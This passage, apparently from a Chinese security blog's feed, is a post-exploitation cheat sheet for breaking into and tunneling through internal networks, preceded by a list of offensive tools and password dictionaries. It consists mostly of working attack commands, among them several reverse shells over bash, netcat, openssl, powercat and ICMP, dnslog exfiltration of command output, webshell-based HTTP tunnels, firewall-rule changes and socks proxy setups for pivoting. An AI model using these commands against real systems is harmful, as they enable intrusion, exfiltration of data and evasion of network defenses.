https:&#x2F;&#x2F;github.com&#x2F;quentinhardy&#x2F;msdat</span><br><span class="line">1521 oracle https:&#x2F;&#x2F;github.com&#x2F;quentinhardy&#x2F;odat</span><br><span class="line">5432 PostgreSQL https:&#x2F;&#x2F;github.com&#x2F;v5est0r&#x2F;fuck_postgres</span><br><span class="line">6379 redis https:&#x2F;&#x2F;github.com&#x2F;Dliv3&#x2F;redis-rogue-server</span><br><span class="line">字典类</span><br><span class="line">字典生成 - https:&#x2F;&#x2F;github.com&#x2F;LandGrey&#x2F;pydictor</span><br><span class="line">一些整理的优秀字典</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;tennc&#x2F;fuzzdb</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;fuzzdb-project&#x2F;fuzzdb</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;TheKingOfDuck&#x2F;fuzzDicts</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;7dog7&#x2F;bottleneckOsmosis</span><br><span class="line">域渗透常用工具</span><br><span class="line">nbtscan.exe http:&#x2F;&#x2F;www.unixwiz.net&#x2F;tools&#x2F;nbtscan.html</span><br><span class="line">SharpHound、BloodHound https:&#x2F;&#x2F;github.com&#x2F;BloodHoundAD</span><br><span class="line">kerberoast https:&#x2F;&#x2F;github.com&#x2F;nidem&#x2F;kerberoastms14068 https:&#x2F;&#x2F;github.com&#x2F;SecWiki&#x2F;windows-kernel-exploits&#x2F;tree&#x2F;master&#x2F;MS14-068&#x2F;pykek</span><br><span class="line">Invoke-ACLpwn https:&#x2F;&#x2F;github.com&#x2F;fox-it&#x2F;Invoke-ACLPwn</span><br><span class="line">PrivExchange https:&#x2F;&#x2F;github.com&#x2F;dirkjanm&#x2F;PrivExchange</span><br><span class="line">Mimikatz https:&#x2F;&#x2F;github.com&#x2F;gentilkiwi&#x2F;mimikatz</span><br><span class="line">adexplorer.exe https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;sysinternals&#x2F;downloads&#x2F;adexplorer</span><br><span class="line">USBCopyerData</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="补几个字典与泄露密码相关的"><a href="#补几个字典与泄露密码相关的" class="headerlink" title="补几个字典与泄露密码相关的:"></a>补几个字典与泄露密码相关的:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hashes.org&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;weakpass.com&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;berzerk0&#x2F;Probable-Wordlists</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;insidetrust&#x2F;statistically-likely-usernames</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;danielmiessler&#x2F;SecLists</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 加密 hasdes@123 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透—隧道穿透</title>
      <link href="2021/06/22/nei-wang-shen-tou-sui-dao-chuan-tou/"/>
      <url>2021/06/22/nei-wang-shen-tou-sui-dao-chuan-tou/</url>
      
        <content type="html"><![CDATA[<h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.转发场景介绍</span><br><span class="line">.连通性测试</span><br><span class="line">.正向端口转发</span><br><span class="line">.反向端口转发</span><br><span class="line">.ssh多级转发</span><br><span class="line">.文件打包&amp;传输</span><br></pre></td></tr></table></figure><h4 id="正向、反向代理"><a href="#正向、反向代理" class="headerlink" title="正向、反向代理"></a>正向、反向代理</h4><p>Client -&gt; Transit server -&gt; Server: Client能够正向连接Transit server。Transit server</p><p>Client &lt;- Transit server -&gt; Server: Client无法正向连接Transit server,但Transit server能够反向连接Client。</p><h5 id="转发场景介绍"><a href="#转发场景介绍" class="headerlink" title="转发场景介绍"></a>转发场景介绍</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">反弹shell</span><br><span class="line">反弹端口</span><br><span class="line">反弹socks</span><br><span class="line">目标处于网络边界,内外网都可以访问,网络边界主机未安装防火墙,所有端口都对互联网开放,</span><br><span class="line">此类业务场景已经极少出现;</span><br><span class="line">目标处于内网,可以访问外网,但是出口部署的有防火墙策略限制外部网络直接访问内网的敏感端</span><br><span class="line">口(3389、22、445、139等);</span><br><span class="line">目标处于内网,不能访问外网,但是可以访问边界主机,防火墙策略限制外部网络直接访问内网的</span><br><span class="line">敏感端口(3389、22、445等)。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="连通性测试"><a href="#连通性测试" class="headerlink" title="连通性测试"></a>连通性测试</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TCP</span><br><span class="line">UDP</span><br><span class="line">ICMP</span><br><span class="line">HTTP\S</span><br><span class="line">DNS</span><br><span class="line">代理测试</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h5><p>内网Windows:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FOR &#x2F;L %i IN (1,1,65535) DO (cmd &#x2F;c &quot;start &#x2F;b telnet 151.*.*.147 %i&quot;) 自动telnet</span><br><span class="line">所有端口</span><br><span class="line">外网vps:</span><br><span class="line">tcpdump</span><br></pre></td></tr></table></figure><h5 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FOR &#x2F;L %i IN (1,1,65535) DO (cmd &#x2F;c &quot;start &#x2F;b nslookup -port&#x3D;%i rcoil.me</span><br><span class="line">151.*.*.147&quot;)</span><br><span class="line">外网vps: nc -lvp port</span><br><span class="line">内网机器: nc -nvv ip port</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ICMP</span><br><span class="line">外网vps:抓包、tcpdump icmp</span><br><span class="line">内网机器:直接ping</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="HTTP-S"><a href="#HTTP-S" class="headerlink" title="HTTP\S"></a>HTTP\S</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">外网vps:nc -lvp 80 (or 8080等)</span><br><span class="line">内网机器: curl vps-ip:8080</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">外网vps: nc -u -lvp 53</span><br><span class="line">内网机器:</span><br><span class="line">windows: nslookup www.baidu.com vps-ip</span><br><span class="line">linux: dig @vps-ip www.baidu.com</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="代理查询"><a href="#代理查询" class="headerlink" title="代理查询"></a>代理查询</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet</span><br><span class="line">Settings&quot;</span><br><span class="line">download PAC:</span><br><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet</span><br><span class="line">Strrings&quot; &#x2F;v AutoConfigURL</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="代理测试"><a href="#代理测试" class="headerlink" title="代理测试"></a>代理测试</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl www.baidu.com &#x2F;&#x2F;不通</span><br><span class="line">curl -x porxy -ip:8080 www.baidu.com &#x2F;&#x2F;通</span><br><span class="line">Tips:</span><br><span class="line">是否有hostname类似于proxy的机器</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line">netcat</span><br><span class="line">ICMP</span><br><span class="line">dnslog</span><br><span class="line">powercat</span><br><span class="line">加密反弹shell</span><br><span class="line">Sctipt Language</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;53 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">正向:</span><br><span class="line">nc -lp 1234 -e cmd.exe</span><br><span class="line">nc -lp 1234 -e &#x2F;bin&#x2F;bash</span><br><span class="line">正向:</span><br><span class="line">win:nc -e cmd.exe ip port</span><br><span class="line">linux:nc -e &#x2F;bin&#x2F;sh ip port</span><br><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;&#x2F;tmp&#x2F;f</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="ICMP-1"><a href="#ICMP-1" class="headerlink" title="ICMP"></a>ICMP</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vps:</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;inquisb&#x2F;icmpsh.git</span><br><span class="line">apt-get install python-impacket</span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1</span><br><span class="line">python icmpsh_m.py 39.xxx.xxx.17 182.xxx.xxx.207</span><br><span class="line">内网 Windows:</span><br><span class="line">icmpsh.exe -t 39.xxx.xxx.17 -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure><h5 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dnslog.cn</span><br><span class="line">Linux</span><br><span class="line">curl http:&#x2F;&#x2F;qqtvut.dnslog.cn&#39;whoami&#39;</span><br><span class="line">ping &#39;whoami&#39;.qqtvut.dnslog.cn</span><br><span class="line">Windows</span><br><span class="line">ping %USERNAME%.b182oj.ceye.io</span><br><span class="line">注:使用场景:SQL盲注、不回显命令执行</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import-module powercat.ps1</span><br><span class="line">powercat -c 192.168.52.131 443 -e cmd.exe</span><br><span class="line">powercat -l -p 443 -t 1000</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="加密反弹shell"><a href="#加密反弹shell" class="headerlink" title="加密反弹shell"></a>加密反弹shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">第一步,在vps上生成SSL证书的公钥&#x2F;私钥对</span><br><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class="line">第二步,在VPS监听反弹shell</span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 4433</span><br><span class="line">第三步 在目标上用openssl加密反弹shell的流量</span><br><span class="line">mkfifo &#x2F;tmp&#x2F;s;&#x2F;bin&#x2F;bash -i &lt; &#x2F;tmp&#x2F;s 2&gt;&amp;1|openssl s_client -quiet -connect 172.16.2.163:4433 &gt;</span><br><span class="line">&#x2F;tmp&#x2F;s;rm &#x2F;tmp&#x2F;s</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Sctipt-Language"><a href="#Sctipt-Language" class="headerlink" title="Sctipt Language"></a>Sctipt Language</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Python</span><br><span class="line">Ruby</span><br><span class="line">Perl</span><br><span class="line">Java</span><br><span class="line">PHP</span><br><span class="line">Powershell</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="全局代理软件"><a href="#全局代理软件" class="headerlink" title="全局代理软件"></a>全局代理软件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ProxifierSocksCap64</span><br><span class="line">proxychains</span><br><span class="line">注: proxychains不支持udp和icmp协议,所以使用nmap要加上-sT、-Pn</span><br></pre></td></tr></table></figure><h6 id="netsh"><a href="#netsh" class="headerlink" title="netsh"></a>netsh</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">新建联入规则</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Allow RDP&quot; dir&#x3D;in action&#x3D;allow protocol&#x3D;TCP</span><br><span class="line">localport&#x3D;8081 &#x2F;&#x2F;允许外部的 tcp 8081 端口连入</span><br><span class="line">查看所有转发规则</span><br><span class="line">netsh interface portproxy show all</span><br><span class="line">添加一个端口映射</span><br><span class="line">netsh interface portproxy set v4tov4 listenaddress&#x3D;192.168.206.101 listenport&#x3D;8080</span><br><span class="line">connectaddress&#x3D;192.168.206.100 connectport&#x3D;3389</span><br><span class="line">清除规则</span><br><span class="line">netsh interface portproxy delete v4tov4 listenaddress&#x3D;192.168.206.101 listenport&#x3D;8080</span><br><span class="line">netsh advfirewall firewall delete rule name&#x3D;&quot;transit test&quot; (防火墙)</span><br><span class="line">Tips:不出网机器,通过边界机器netsh出</span><br><span class="line">A - 边界 - 公网 (被动连接,创建规则即可)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="EW"><a href="#EW" class="headerlink" title="EW"></a>EW</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">正向连接,直接架设服务端</span><br><span class="line">.&#x2F;ew -s ssocked -l 1080</span><br><span class="line">直接配置代理即可</span><br><span class="line">二级</span><br><span class="line">B:</span><br><span class="line">ew_for_Win.exe -s ssocksd -l 8888</span><br><span class="line">A:</span><br><span class="line">ew_for_Win.exe -s lcx_tran -l 1080 -f 192.168.153</span><br><span class="line">Attcker:</span><br><span class="line">proxy to 10.129.72.168:8080</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="Termite"><a href="#Termite" class="headerlink" title="Termite"></a>Termite</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.以服务模式启动一个agent服务。</span><br><span class="line">.&#x2F;agent -l p 8888</span><br><span class="line">2.令管理端连接到agent并对agent进行管理。</span><br><span class="line">.&#x2F;admin -c 127.0.0.1 -p 8888</span><br><span class="line">3.show</span><br><span class="line">0M</span><br><span class="line">+-- 1M</span><br><span class="line">| +-- 2M</span><br><span class="line">4.开启socks</span><br><span class="line">goto 2</span><br><span class="line">socks 1080</span><br><span class="line">5.shell</span><br><span class="line">shell 7777</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="Http隧道穿透"><a href="#Http隧道穿透" class="headerlink" title="Http隧道穿透"></a>Http隧道穿透</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">reDuh</span><br><span class="line">java -jar reDuhClient.jar http:&#x2F;&#x2F;192.168.10.50&#x2F;uploads&#x2F;reDuh.jsp</span><br><span class="line">nc -nvv 127.0.0.1 1010</span><br><span class="line">[createTunnel] 7777:172.16.0.4:3389</span><br><span class="line">reGeorg(建议无socket版)</span><br><span class="line">python reGeorgSocksProxy.py -p 8080 -u http:&#x2F;&#x2F;1.2.3.4&#x2F;tunnel.php</span><br><span class="line">Tunna</span><br><span class="line">python proxy.py -u http:&#x2F;&#x2F;192.168.113.210&#x2F;conn.aspx -l 1080 -v</span><br><span class="line">python proxy.py -u http:&#x2F;&#x2F;192.168.113.210&#x2F;conn.aspx -l 99 -r 8080 -s -v -ndtunnel</span><br><span class="line">python dt.py -u</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="Http隧道穿透-1"><a href="#Http隧道穿透-1" class="headerlink" title="Http隧道穿透"></a>Http隧道穿透</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Abptts</span><br><span class="line">pip install httplib2</span><br><span class="line">pip install pycrypto</span><br><span class="line">单端口</span><br><span class="line">python abpttsclient.py -c webshell&#x2F;config.txt -u http:&#x2F;&#x2F;192.168.113.210&#x2F;f.aspx -f</span><br><span class="line">127.0.0.1:1111&#x2F;127.0.0.1:8080</span><br><span class="line">多端口</span><br><span class="line">python abpttsclient.py -c webshell&#x2F;config.txt -u http:&#x2F;&#x2F;192.168.113.210&#x2F;f.aspx -f</span><br><span class="line">127.0.0.1:1111&#x2F;127.0.0.1:8080 -f 127.0.0.1:2222&#x2F;172.16.0.12:443</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="ssh转发-修改配置"><a href="#ssh转发-修改配置" class="headerlink" title="ssh转发 - 修改配置"></a>ssh转发 - 修改配置</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">修改ssh配置</span><br><span class="line">vi &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">AllowTcpForwarding yes</span><br><span class="line">GatewayPorts yes</span><br><span class="line">TCPKeepAlive yes 保持心跳,防止 ssh 断开</span><br><span class="line">PermitTuneel yes #Tunnel启用</span><br><span class="line">ClientAliveInterval 60 #指定了服务器端向客户端请求消息的时间间隔,</span><br><span class="line">ClientAliveCountMax 3 #请求后客户端没有响应的次数达到3次,就自动断开</span><br><span class="line">PasswordAuthentication yes</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;ssh restart</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="ssh正向转发"><a href="#ssh正向转发" class="headerlink" title="ssh正向转发"></a>ssh正向转发</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ssh正向端口转发(非目标机器执行)</span><br><span class="line">ssh -CfNg -L lport:172.16.0.7:3389 root@172.16.0.155 -p 22</span><br><span class="line">ssh正向socks代理</span><br><span class="line">putty开启</span><br><span class="line">Putty Configuration &gt; Connection &gt; SSH &gt; Tunnels &gt; D1080 Dynamic</span><br><span class="line">反向端口转发</span><br><span class="line">Lhost &lt; - - - &gt; proxy &lt; - - - &gt; firewal &lt; - - - &gt; Rhost</span><br><span class="line">lcx</span><br><span class="line">ew</span><br><span class="line">Termite</span><br><span class="line">ssocksPowershell</span><br><span class="line">FRP</span><br><span class="line">rinetd</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="ssh反向转发"><a href="#ssh反向转发" class="headerlink" title="ssh反向转发"></a>ssh反向转发</h6><p>lcx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">被控端 lcx -slave 控制端ip port 被控端ip port</span><br><span class="line">控制端 lcx -listen 接收端口 使用端口</span><br><span class="line">FRP</span><br><span class="line">frp 是一个可用于内网穿透的高性能的反向代理应用</span><br><span class="line">支持 tcp,udp 协议,http 和 https 应用协议</span><br><span class="line">frp 采用go语言开发,支持Windows、*nix</span><br><span class="line">分为服务端、客户端。服务端部署在VPS,客户端部署在跳板机</span><br><span class="line">配置文件:</span><br><span class="line">&#x2F;frps.ini</span><br><span class="line">&#x2F;frpc.ini</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>FRP配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">server:</span><br><span class="line">[common]</span><br><span class="line">bind_addr &#x3D; 0.0.0.0</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line">token &#x3D; dm.org</span><br><span class="line">dashboard_addr &#x3D; 0.0.0.0</span><br><span class="line">adshboard_port &#x3D; 7438</span><br><span class="line">[socks5]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 8010</span><br><span class="line">plugin &#x3D; socks5</span><br></pre></td></tr></table></figure><p>FRP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">server:</span><br><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 服务端IP</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">token &#x3D; dm.org</span><br><span class="line">dashboard_addr &#x3D; 0.0.0.0dashboard_port &#x3D; 7438</span><br><span class="line">dashboard_user &#x3D; dm</span><br><span class="line">dashboard_pwd &#x3D; sdob23242@#</span><br><span class="line">[socks5_proxy]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D;8010</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">plugin_user &#x3D; dm123</span><br><span class="line">Rinetd</span><br><span class="line">添加防火墙规则</span><br><span class="line">netsh advfirewall friewall add rul name&#x3D;&quot;transit test2&quot; dir&#x3D;in program&#x3D;&quot;c:test&#x2F;rinetd.exe&quot;</span><br><span class="line">action&#x3D;allow</span><br><span class="line">编写规则</span><br><span class="line">启动</span><br><span class="line">编写规则</span><br><span class="line">echo 0.0.0.0 7777 192.168.111.103 4444 &gt; conf.txt</span><br><span class="line">启动</span><br><span class="line">rinetd.exe -c c:&#x2F;test&#x2F;conf.txt</span><br><span class="line">清除防火墙规则</span><br><span class="line">netsh advfirewall firewall delete rule name&#x3D;&quot;transit test2&quot; dir&#x3D;in</span><br><span class="line">ssh 参数</span><br><span class="line">-C 压缩传输,加快传输速度</span><br><span class="line">-f 在后台对用户名密码进行认证</span><br><span class="line">-N 仅仅只用来转发,不用在弹回一个新的shell -n 后台运行</span><br><span class="line">-q 安静模式,不要显示任何debug信息</span><br><span class="line">-l 指定ssh登录名</span><br><span class="line">-g 允许远程主机连接到本地用于转发的端口</span><br><span class="line">-L 进行本地端口转发</span><br><span class="line">-R 进行远程端口转发</span><br><span class="line">-D 动态转发,即socks代理</span><br><span class="line">-T 禁止分配伪终端</span><br><span class="line">-p 指定远程ssh服务端口</span><br><span class="line">ssh 反向转发修改ssh配置</span><br><span class="line">反向端口转发(目标机器执行)</span><br><span class="line">ssh -CfNg -R sshsrvport:172.16.0.7:3389 root@172.16.0.155 -p 22</span><br><span class="line">vi .&#x2F;rinetd.conf</span><br><span class="line">0.0.0.0 3389 127.0.0.1 1389</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;rinetd -c rinetd.conf</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="反向socks代理"><a href="#反向socks代理" class="headerlink" title="反向socks代理"></a>反向socks代理</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ssh -qTfnN -D 0.0.0.0:1080 root@127.0.0.1 -p 22 &#x2F;&#x2F;监听端口(跳板机)</span><br><span class="line">ssh -CfNg -R 0.0.0.0:1081:127.0.0.1:1080 root@192.168.3.96 -p 522 &#x2F;&#x2F;建立连接 (跳板机)</span><br><span class="line">Date Exfiltration</span><br><span class="line">文件打包</span><br><span class="line">文件切片</span><br><span 